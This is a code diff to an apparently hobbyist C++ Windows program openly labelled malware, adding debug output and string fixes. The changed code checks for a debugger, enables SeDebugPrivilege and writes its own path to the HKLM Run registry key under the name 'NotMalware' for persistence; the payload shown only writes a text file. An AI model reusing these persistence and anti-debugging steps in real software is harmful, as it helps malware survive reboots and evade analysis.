@@ -22,7 +22,7 @@ string Xor_OP(const char * str) {
 };
 
 int malware() {
-
+	cout << "Malware!!";
 	ofstream yourData("YourData.txt");
 	yourData << "Brent";
 
@@ -43,11 +43,9 @@ int malware() {
 };
 
 string get_current_WD() {
-	TCHAR buffer[MAX_PATH] = { 0 };
+	char buffer[MAX_PATH] = { 0 };
 	GetModuleFileNameA(nullptr, (LPSTR)buffer, MAX_PATH);
-	std:wstring wStr = buffer;
-	string str = std::string(wStr.begin(), wStr.end());
-	return str;
+	return string(buffer);
 }
 
 bool EnableSeDebugPrivilege()
@@ -92,9 +90,10 @@ bool EnableSeDebugPrivilege()
 int regedit(string filename) {
 	HKEY hKey;
 
-	int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPWSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
+	cout << res;
 	if (res == ERROR_SUCCESS) {
-
+		cout << "success";
 		if (RegSetValueExW(hKey, (LPCWSTR)"NotMalware", 0, REG_SZ, (BYTE *)&filename, (filename.size() + 1)))
 		{
 			cout << "Key Not Updated" << endl;
@@ -113,8 +112,11 @@ int regedit(string filename) {
 
 int main() {
 	if (!IsDebuggerPresent()) {
+		cout << "debugger not present";
 		if (EnableSeDebugPrivilege()) {
+			cout << "priviliedge enabled";
 			const string current_WD = get_current_WD();
+			cout << current_WD;
 			if (regedit(current_WD)) {
 				int i = 0;
 				i += 1;
